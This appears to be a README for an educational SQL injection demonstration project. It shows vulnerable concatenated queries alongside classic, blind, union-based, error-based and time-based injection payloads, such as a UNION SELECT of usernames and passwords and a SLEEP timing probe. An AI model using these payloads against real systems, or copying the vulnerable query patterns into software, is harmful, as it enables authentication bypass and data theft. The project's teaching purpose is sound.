# SQL-Injections

# SQL Injection Project

## Overview
This project is a demonstration of various types of SQL injection attacks and how they can be exploited in web applications. It includes examples of different types of SQL injection vulnerabilities and how they can be mitigated.

## Usage
1. Open your web browser and navigate to `http://localhost:3000` (or the appropriate URL if you've configured it differently).

2. Explore the different sections of the application to see examples of SQL injection vulnerabilities and how they can be exploited.

3. Experiment with different payloads and inputs to understand how SQL injection attacks work.

## Features
- Classic SQL injection examples
- Union-based SQL injection examples
- Blind SQL injection examples
- Error-based SQL injection examples
- Time-based SQL injection examples
- Suggestions for mitigating SQL injection vulnerabilities

## Contributing
Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request.

-- 1. Classic SQL Injection:

--Suppose we have a login form where the username and password are concatenated directly into an SQL query without proper validation:
```SELECT * FROM users WHERE username = '$username' AND password = '$password';```

--An attacker could input the following into the username field:
' OR '1'='1

--The resulting SQL query becomes:
```SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '$password';```

-- This would allow the attacker to bypass authentication because the condition '1'='1' is always true.



-- 2. Blind SQL Injection:

--Suppose the application responds differently based on whether a condition is true or false. An attacker could exploit this behavior to extract data.

--or example, the attacker might input:

``` ' AND (SELECT COUNT(*) FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a') = 1```


-- 3. Union-Based SQL Injection:

``` SELECT * FROM products WHERE category = '$category'; ```
' UNION SELECT username, password FROM users ```

-- If the number of columns matches, this would effectively append the results of the SELECT username, password FROM users query to the original query, potentially leaking sensitive information.


-- 4. Error-Based SQL Injection:

-- Suppose the application generates detailed error messages that reveal information about the database structure:
```SELECT * FROM products WHERE id = $id;```


-- An attacker might input:
```' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- ```

-- 5. Time-Based SQL Injection:

-- Suppose the application has a search feature that delays the response if a result is found:

``` SELECT * FROM products WHERE name = '$search_term'; ```

An attacker might input:

``` ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) ```

-- If the application delays its response, the attacker can infer that the first character of the database name is 'a'.
